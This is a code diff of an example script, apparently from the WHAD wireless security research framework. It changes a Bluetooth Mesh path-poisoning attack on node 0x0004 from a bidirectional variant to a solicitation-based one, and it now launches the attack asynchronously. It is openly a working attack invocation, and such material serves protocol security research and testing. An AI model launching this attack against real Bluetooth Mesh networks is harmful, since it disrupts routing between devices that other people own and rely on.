@@ -2,9 +2,9 @@ from whad.device import WhadDevice
 from whad.ble.exceptions import ConnectionLostException
 import sys
 from whad.btmesh.connector.provisionee import Provisionee
-from whad.btmesh.attacker.path_poison_bidir import (
-    PathPoisonBidirAttacker,
-    PathPoisonBidirConfiguration,
+from whad.btmesh.attacker.path_poison_solicitation import (
+    PathPoisonSolicitationAttacker,
+    PathPoisonSolicitationConfiguration,
 )
 from time import sleep
 from whad.btmesh.stack.utils import MeshMessageContext
@@ -28,16 +28,17 @@ try:
     print("Node is (auto) provisioned !")
 
     # Create the attacker object and launch the attack
-    attack_conf = PathPoisonBidirConfiguration()
+    attack_conf = PathPoisonSolicitationConfiguration()
     attack_conf.victim = 0x0004  # attack node 0x04
 
-    attacker = PathPoisonBidirAttacker(connector=provisionee, configuration=attack_conf)
+    attacker = PathPoisonSolicitationAttacker(connector=provisionee, configuration=attack_conf)
 
-    print("Lauching the PathPoisonBidir attack on 0x%x" % attack_conf.victim)
-    attacker.launch(asynch=False)
+    print("Lauching the PathPoisonSolicitation attack...")
+    attacker.launch(asynch=True)
 
-    attacker.show_result()
-
+    while True:
+        input("Press any key and enter to get results. Ctrl-C to quit.")
+        attacker.show_result()
 
 except ConnectionLostException as e:
     print("Connection lost", e)
@@ -48,6 +49,3 @@ except (KeyboardInterrupt, SystemExit):
 except WhadDeviceNotFound:
     print("[e] Device not found")
     exit(1)
-
-
-exit(0)
